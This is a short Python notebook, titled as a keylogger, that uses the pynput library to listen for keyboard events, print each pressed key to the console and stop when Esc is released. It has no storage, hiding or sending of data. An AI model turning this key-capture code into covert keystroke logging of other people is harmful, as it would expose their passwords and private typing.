# %% [markdown]
# <a href="https://colab.research.google.com/github/snipverse/cryptography/blob/main/keylogger.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %%
# !pip install pynput

# %%
from pynput.keyboard import Key, Listener

def keypress(key):
    print("Key pressed is:", key)

def keyrelease(key):
    if key == Key.esc:
        return False

with Listener(on_press=keypress, on_release=keyrelease) as lst:
    lst.join()
